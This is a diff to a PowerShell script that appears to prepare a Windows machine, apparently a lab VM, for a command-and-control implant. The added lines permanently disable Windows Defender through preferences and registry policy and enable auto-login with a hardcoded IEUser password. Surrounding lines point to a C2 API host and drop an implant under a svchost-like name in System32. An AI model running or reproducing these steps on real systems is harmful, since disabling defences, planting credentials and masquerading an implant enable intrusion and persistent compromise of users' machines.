@@ -4,6 +4,29 @@
 param()
 
 $ErrorActionPreference = "Stop"
+
+# ── Disable Windows Defender (permanent) ─────────────────────────────────
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    # Registry policy (reboot-proof):
+    $dp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    New-Item -Path $dp -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty $dp "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    New-Item -Path "$dp\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty "$dp\Real-Time Protection" "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    Write-Log "Defender disabled"
+} catch { Write-Log "Defender disable: $_" }
+
+# ── Auto-login (no password on reboot) ───────────────────────────────────
+try {
+    $wl = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    Set-ItemProperty $wl "AutoAdminLogon"  -Value "1"       -Type String
+    Set-ItemProperty $wl "DefaultUsername" -Value "IEUser"  -Type String
+    Set-ItemProperty $wl "DefaultPassword" -Value "Passw0rd!" -Type String
+    Write-Log "Auto-login enabled (IEUser)"
+} catch { Write-Log "Auto-login: $_" }
+
 $C2Host  = if ($env:C2_HOST)  { $env:C2_HOST  } else { "192.168.56.10" }
 $ApiBase = "http://${C2Host}:8080/api/v1"
 $ImplantPath = "C:\Windows\System32\svchost_update.exe"
